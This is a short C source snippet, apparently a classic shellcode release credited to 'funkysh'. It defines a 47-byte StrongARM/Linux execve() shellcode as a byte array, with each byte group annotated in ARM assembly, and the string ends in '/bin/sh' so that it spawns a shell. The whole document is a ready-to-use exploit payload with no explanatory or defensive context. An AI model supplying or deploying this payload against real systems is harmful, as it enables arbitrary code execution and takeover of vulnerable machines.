/*
 * 47 byte StrongARM/Linux execve() shellcode
 * funkysh
 */

char shellcode[]= "\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
                  "\x1c\x30\x8f\xe2"   /*  add   r3, pc, #28 (0x1c)    */
                  "\x04\x30\x8d\xe5"   /*  str   r3, [sp, #4]          */
                  "\x08\x20\x8d\xe5"   /*  str   r2, [sp, #8]          */
                  "\x13\x02\xa0\xe1"   /*  mov   r0, r3, lsl r2        */
                  "\x07\x20\xc3\xe5"   /*  strb  r2, [r3, #7           */
                  "\x04\x30\x8f\xe2"   /*  add   r3, pc, #4            */
                  "\x04\x10\x8d\xe2"   /*  add   r1, sp, #4            */
                  "\x01\x20\xc3\xe5"   /*  strb  r2, [r3, #1]          */
                  "\x0b\x0b\x90\xef"   /*  swi   0x90ff0b              */
                  "/bin/sh";